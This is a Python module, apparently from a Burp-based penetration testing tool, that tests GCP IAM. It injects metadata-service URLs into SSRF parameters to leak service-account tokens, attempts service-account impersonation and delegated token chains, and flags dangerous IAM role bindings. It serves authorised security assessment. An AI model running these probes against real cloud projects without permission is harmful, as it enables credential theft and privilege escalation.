"""GCP IAM privilege escalation and service account impersonation test engine.

Tests for:
- Service account impersonation via ``generateAccessToken``
- Delegated impersonation chains (SA → SA → SA)
- Dangerous IAM permission grants (actAs, signBlob, signJwt, …)
- GCP metadata SSRF to steal SA tokens
- Service account key creation (persistent backdoor)
- Cross-project impersonation
"""

from __future__ import annotations

import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any

from .burp_mcp_client import BurpMcpClient
from .config import GcpConfig
from .models import (
    Finding,
    HttpRequest,
    HttpResponse,
    Severity,
    UserSession,
    VulnerabilityType,
)
from .vuln_knowledge import (
    GCP_METADATA_PATHS,
    GCP_PRIVESC_PERMISSIONS,
)

logger = logging.getLogger(__name__)

_GCP_IAM_API = "https://iam.googleapis.com/v1"
_GCP_CRM_API = "https://cloudresourcemanager.googleapis.com/v1"
_GCP_METADATA_BASE = "http://metadata.google.internal"


# ---------------------------------------------------------------------------
# Result models
# ---------------------------------------------------------------------------

@dataclass
class IamBinding:
    """A single IAM role binding on a resource."""
    role: str
    members: list[str] = field(default_factory=list)


@dataclass
class PrivescPath:
    """A discovered privilege escalation path."""
    source_identity: str
    target_identity: str
    method: str  # "impersonation", "key_creation", "setIamPolicy", etc.
    permissions_used: list[str] = field(default_factory=list)
    description: str = ""


@dataclass
class GcpIamTestResult:
    """Aggregated results from GCP IAM testing."""
    metadata_exposed: bool = False
    metadata_findings: list[dict[str, Any]] = field(default_factory=list)
    impersonation_findings: list[PrivescPath] = field(default_factory=list)
    permission_findings: list[dict[str, Any]] = field(default_factory=list)
    policy_findings: list[dict[str, Any]] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class GcpIamEngine:
    """Tests for GCP IAM privilege escalation and misconfiguration."""

    def __init__(self, burp_client: BurpMcpClient, gcp_config: GcpConfig) -> None:
        self._burp = burp_client
        self._config = gcp_config

    async def run(
        self,
        session: UserSession,
        *,
        target_url: str = "",
    ) -> list[Finding]:
        """Run all GCP IAM tests and return findings."""
        findings: list[Finding] = []

        if target_url:
            findings.extend(await self._test_metadata_ssrf(session, target_url))

        if self._config.project_id:
            findings.extend(
                await self._test_iam_policy_enumeration(session)
            )

        if self._config.target_service_account:
            findings.extend(
                await self._test_sa_impersonation(session)
            )
            findings.extend(
                await self._test_sa_key_creation(session)
            )

        if self._config.impersonation_chain:
            findings.extend(
                await self._test_delegated_impersonation(session)
            )

        return findings

    # ------------------------------------------------------------------
    # Test: GCP metadata SSRF
    # ------------------------------------------------------------------

    async def _test_metadata_ssrf(
        self,
        session: UserSession,
        target_url: str,
    ) -> list[Finding]:
        """Probe the target for SSRF to GCP metadata service."""
        findings: list[Finding] = []
        for path in GCP_METADATA_PATHS:
            metadata_url = _GCP_METADATA_BASE + path
            probe_request = HttpRequest(
                method="GET",
                url=target_url,
                headers={
                    **session.headers,
                    "Metadata-Flavor": "Google",
                },
            )
            # Inject the metadata URL into common SSRF parameters
            for param in ("url", "target", "redirect", "callback", "next"):
                mutated = _inject_query_param(probe_request, param, metadata_url)
                try:
                    response = await self._burp.send_request(mutated)
                except Exception:
                    continue
                hits = _check_metadata_response(response, path)
                if hits:
                    findings.append(Finding(
                        vulnerability_type=VulnerabilityType.GCP_IAM_BYPASS,
                        severity=Severity.CRITICAL,
                        endpoint=target_url,
                        description=(
                            f"GCP metadata SSRF: {path} accessible via SSRF. "
                            f"Indicators: {hits}"
                        ),
                        modified_request=mutated,
                        modified_response=response,
                        reproduction_steps=[
                            f"Send request to {target_url} with param '{param}' "
                            f"set to {metadata_url}",
                            "Include Metadata-Flavor: Google header",
                            f"Observe indicators: {'; '.join(hits)}",
                        ],
                    ))
        return findings

    # ------------------------------------------------------------------
    # Test: IAM policy enumeration for dangerous permissions
    # ------------------------------------------------------------------

    async def _test_iam_policy_enumeration(
        self,
        session: UserSession,
    ) -> list[Finding]:
        """Check project IAM policy for dangerous permission grants."""
        findings: list[Finding] = []
        project_id = self._config.project_id

        # Request the project IAM policy
        policy_url = (
            f"{_GCP_CRM_API}/projects/{project_id}:getIamPolicy"
        )
        request = HttpRequest(
            method="POST",
            url=policy_url,
            headers={
                **session.headers,
                "Content-Type": "application/json",
            },
            body="{}",
        )
        try:
            response = await self._burp.send_request(request)
        except Exception as exc:
            logger.warning("IAM policy fetch failed: %s", exc)
            return findings

        if response.status_code != 200:
            return findings

        bindings = _parse_iam_bindings(response.body)
        dangerous = _find_dangerous_bindings(bindings)

        for binding, reason in dangerous:
            findings.append(Finding(
                vulnerability_type=VulnerabilityType.GCP_PRIVILEGE_ESCALATION,
                severity=Severity.HIGH,
                endpoint=policy_url,
                description=(
                    f"Dangerous IAM binding: role={binding.role}, "
                    f"members={binding.members}. {reason}"
                ),
                modified_request=request,
                modified_response=response,
                reproduction_steps=[
                    f"Fetch IAM policy for project {project_id}",
                    f"Observe role {binding.role} granted to {binding.members}",
                    f"Risk: {reason}",
                ],
            ))

        return findings

    # ------------------------------------------------------------------
    # Test: Service account impersonation
    # ------------------------------------------------------------------

    async def _test_sa_impersonation(
        self,
        session: UserSession,
    ) -> list[Finding]:
        """Attempt to impersonate the target service account."""
        findings: list[Finding] = []
        sa = self._config.target_service_account

        # Try generateAccessToken
        token_url = (
            f"{_GCP_IAM_API}/projects/-/serviceAccounts/{sa}"
            f":generateAccessToken"
        )
        request = HttpRequest(
            method="POST",
            url=token_url,
            headers={
                **session.headers,
                "Content-Type": "application/json",
            },
            body=json.dumps({
                "scope": ["https://www.googleapis.com/auth/cloud-platform"],
                "lifetime": "300s",
            }),
        )
        try:
            response = await self._burp.send_request(request)
        except Exception as exc:
            logger.warning("SA impersonation test failed: %s", exc)
            return findings

        if response.status_code == 200 and _response_has_token(response):
            findings.append(Finding(
                vulnerability_type=VulnerabilityType.GCP_PRIVILEGE_ESCALATION,
                severity=Severity.CRITICAL,
                endpoint=token_url,
                description=(
                    f"Service account impersonation succeeded: able to "
                    f"generate access token for {sa}. This allows full "
                    f"privilege escalation to the SA's permissions."
                ),
                modified_request=request,
                modified_response=response,
                reproduction_steps=[
                    f"Call generateAccessToken for SA {sa}",
                    "Observe that an access_token is returned",
                    f"Use the token to act as {sa}",
                ],
            ))

        # Try generateIdToken
        id_token_url = (
            f"{_GCP_IAM_API}/projects/-/serviceAccounts/{sa}"
            f":generateIdToken"
        )
        id_request = HttpRequest(
            method="POST",
            url=id_token_url,
            headers={
                **session.headers,
                "Content-Type": "application/json",
            },
            body=json.dumps({
                "audience": "https://example.com",
                "includeEmail": True,
            }),
        )
        try:
            id_response = await self._burp.send_request(id_request)
        except Exception:
            return findings

        if id_response.status_code == 200 and '"token"' in id_response.body:
            findings.append(Finding(
                vulnerability_type=VulnerabilityType.GCP_IAM_BYPASS,
                severity=Severity.HIGH,
                endpoint=id_token_url,
                description=(
                    f"Can generate ID token for {sa}. "
                    f"This may allow authentication bypass to services "
                    f"that trust this SA identity."
                ),
                modified_request=id_request,
                modified_response=id_response,
                reproduction_steps=[
                    f"Call generateIdToken for SA {sa}",
                    "Observe that a signed ID token is returned",
                    "Use the token to authenticate to downstream services",
                ],
            ))

        return findings

    # ------------------------------------------------------------------
    # Test: Service account key creation (persistent backdoor)
    # ------------------------------------------------------------------

    async def _test_sa_key_creation(
        self,
        session: UserSession,
    ) -> list[Finding]:
        """Test whether we can create a key for the target SA."""
        findings: list[Finding] = []
        sa = self._config.target_service_account

        # Only test if we can check — don't actually create keys
        # We probe with a dry-run-like approach: check testIamPermissions
        test_url = (
            f"{_GCP_IAM_API}/projects/-/serviceAccounts/{sa}"
            f":testIamPermissions"
        )
        request = HttpRequest(
            method="POST",
            url=test_url,
            headers={
                **session.headers,
                "Content-Type": "application/json",
            },
            body=json.dumps({
                "permissions": [
                    "iam.serviceAccountKeys.create",
                    "iam.serviceAccounts.actAs",
                    "iam.serviceAccounts.getAccessToken",
                    "iam.serviceAccounts.signBlob",
                    "iam.serviceAccounts.signJwt",
                ],
            }),
        )
        try:
            response = await self._burp.send_request(request)
        except Exception:
            return findings

        if response.status_code == 200:
            granted = _extract_granted_permissions(response.body)
            dangerous = [p for p in granted if p in GCP_PRIVESC_PERMISSIONS]
            if dangerous:
                findings.append(Finding(
                    vulnerability_type=VulnerabilityType.GCP_PRIVILEGE_ESCALATION,
                    severity=Severity.CRITICAL,
                    endpoint=test_url,
                    description=(
                        f"Caller has dangerous permissions on {sa}: "
                        f"{dangerous}. These permissions enable privilege "
                        f"escalation via impersonation or key creation."
                    ),
                    modified_request=request,
                    modified_response=response,
                    reproduction_steps=[
                        f"Test IAM permissions on SA {sa}",
                        f"Observe granted permissions: {dangerous}",
                        "These permissions allow privilege escalation",
                    ],
                ))

        return findings

    # ------------------------------------------------------------------
    # Test: Delegated impersonation chain
    # ------------------------------------------------------------------

    async def _test_delegated_impersonation(
        self,
        session: UserSession,
    ) -> list[Finding]:
        """Test multi-hop impersonation chains (SA → SA → SA)."""
        findings: list[Finding] = []
        chain = self._config.impersonation_chain
        if len(chain) < 2:
            return findings

        # Try to impersonate the last SA in the chain using delegation
        target_sa = chain[-1]
        delegates = chain[:-1]

        token_url = (
            f"{_GCP_IAM_API}/projects/-/serviceAccounts/{target_sa}"
            f":generateAccessToken"
        )
        request = HttpRequest(
            method="POST",
            url=token_url,
            headers={
                **session.headers,
                "Content-Type": "application/json",
            },
            body=json.dumps({
                "delegates": [
                    f"projects/-/serviceAccounts/{d}" for d in delegates
                ],
                "scope": ["https://www.googleapis.com/auth/cloud-platform"],
                "lifetime": "300s",
            }),
        )
        try:
            response = await self._burp.send_request(request)
        except Exception:
            return findings

        if response.status_code == 200 and _response_has_token(response):
            chain_str = " → ".join(delegates + [target_sa])
            findings.append(Finding(
                vulnerability_type=VulnerabilityType.GCP_PRIVILEGE_ESCALATION,
                severity=Severity.CRITICAL,
                endpoint=token_url,
                description=(
                    f"Delegated impersonation chain succeeded: {chain_str}. "
                    f"Can escalate to {target_sa} via intermediate SAs."
                ),
                modified_request=request,
                modified_response=response,
                reproduction_steps=[
                    f"Call generateAccessToken for {target_sa}",
                    f"Use delegates: {delegates}",
                    "Observe that an access_token is returned",
                    f"Full chain: {chain_str}",
                ],
            ))

        return findings


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject_query_param(
    request: HttpRequest, param: str, value: str
) -> HttpRequest:
    """Inject a query parameter into a request URL."""
    import copy
    from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

    mutated = copy.deepcopy(request)
    parsed = urlparse(mutated.url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    mutated.url = urlunparse(parsed._replace(query=new_query))
    return mutated


def _check_metadata_response(
    response: HttpResponse, path: str
) -> list[str]:
    """Check if a response contains GCP metadata indicators."""
    hits: list[str] = []
    body = response.body or ""

    if "token" in path.lower():
        if re.search(r'"access_token"\s*:', body):
            hits.append("Response contains access_token (SA token leaked)")
        if re.search(r'"token_type"\s*:\s*"Bearer"', body):
            hits.append("Response contains Bearer token type")

    if "scopes" in path.lower():
        if "googleapis.com/auth" in body:
            hits.append("Response contains GCP OAuth scopes")

    if "service-accounts/" in path and path.endswith("/"):
        if re.search(r"[\w.-]+@[\w.-]+\.iam\.gserviceaccount\.com", body):
            hits.append("Response contains service account email")

    if "project-id" in path:
        # A short alphanumeric response is likely a project ID
        stripped = body.strip()
        if stripped and len(stripped) < 100 and re.match(r"^[\w-]+$", stripped):
            hits.append(f"Response looks like a project ID: {stripped}")

    if "kube-env" in path:
        if "KUBERNETES" in body.upper() or "KUBELET" in body.upper():
            hits.append("Response contains Kubernetes environment config")

    # Generic metadata indicators
    if response.status_code == 200:
        if "Metadata-Flavor" in response.headers:
            hits.append("Response has Metadata-Flavor header")
        if "computeMetadata" in body:
            hits.append("Response body references computeMetadata")

    return hits


def _parse_iam_bindings(body: str) -> list[IamBinding]:
    """Parse IAM policy bindings from JSON response."""
    try:
        data = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return []
    bindings: list[IamBinding] = []
    for b in data.get("bindings", []):
        bindings.append(IamBinding(
            role=b.get("role", ""),
            members=b.get("members", []),
        ))
    return bindings


def _find_dangerous_bindings(
    bindings: list[IamBinding],
) -> list[tuple[IamBinding, str]]:
    """Identify IAM bindings that enable privilege escalation."""
    dangerous: list[tuple[IamBinding, str]] = []

    # Roles that directly grant owner/editor-level access
    high_risk_roles = {
        "roles/owner": "Full project owner access",
        "roles/editor": "Broad editor access — can modify most resources",
        "roles/iam.serviceAccountAdmin": "Can manage all service accounts",
        "roles/iam.serviceAccountKeyAdmin": "Can create SA keys (persistent access)",
        "roles/iam.serviceAccountTokenCreator": "Can impersonate any SA",
        "roles/iam.securityAdmin": "Can grant any IAM role",
        "roles/resourcemanager.projectIamAdmin": "Can modify project IAM policy",
        "roles/cloudfunctions.admin": "Can deploy functions as any SA",
        "roles/compute.admin": "Can create VMs with any SA attached",
        "roles/run.admin": "Can deploy Cloud Run services as any SA",
    }

    for binding in bindings:
        if binding.role in high_risk_roles:
            reason = high_risk_roles[binding.role]
            # Flag non-Google-managed SAs and user accounts
            for member in binding.members:
                if _is_user_or_sa(member):
                    dangerous.append((binding, reason))
                    break

    return dangerous


def _is_user_or_sa(member: str) -> bool:
    """Check if an IAM member is a user or service account (not Google-managed)."""
    return (
        member.startswith("user:")
        or member.startswith("serviceAccount:")
        or member.startswith("group:")
        or member == "allUsers"
        or member == "allAuthenticatedUsers"
    )


def _response_has_token(response: HttpResponse) -> bool:
    """Check if a response body contains an access token."""
    body = response.body or ""
    return bool(re.search(r'"access_token"\s*:', body))


def _extract_granted_permissions(body: str) -> list[str]:
    """Extract granted permissions from a testIamPermissions response."""
    try:
        data = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return []
    return data.get("permissions", [])
